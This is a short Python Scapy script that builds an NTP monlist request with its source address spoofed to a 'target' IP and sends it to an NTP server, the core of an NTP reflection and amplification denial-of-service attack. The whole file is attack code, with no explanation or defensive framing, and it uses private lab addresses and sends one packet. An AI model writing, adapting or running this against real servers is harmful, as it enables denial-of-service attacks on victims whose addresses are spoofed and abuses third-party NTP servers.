from scapy.all import *
import random

# target server
target = '192.168.1.107'

# ntp server
ntpserver = '192.168.1.101'

# NTP monlist packet
data = "\x17\x00\x03\x2a" + "\x00" *4*11

packet = IP(dst=ntpserver,src=target)/UDP(sport=random.randint(2000,65535),dport=123)/Raw(load=data)
send(packet, loop=0)
